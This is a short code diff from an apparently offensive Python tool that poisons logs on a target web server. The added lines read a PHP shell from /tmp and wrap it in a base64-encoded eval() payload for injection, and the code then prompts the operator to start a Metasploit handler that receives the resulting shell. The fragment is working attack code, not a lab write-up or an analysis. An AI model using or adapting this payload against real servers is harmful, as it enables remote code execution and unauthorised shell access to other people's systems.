@@ -281,6 +281,8 @@ class Logs:
             payload_file = open("/tmp/{0}.php".format(shell), "r")
             payload = payload_file.read()
             payload += quote_plus(payload_file.read().replace("\"", "\\\"").replace("$", "\\$"))
+            payload_file = open("/tmp/{0}.php".format(shell),"r")
+            payload = "<?php eval(base64_decode('{0}')); ?>".format(payload_file.read().encode('base64').replace("\n", ""))
             payload_file.close()
             progressbar()
             raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
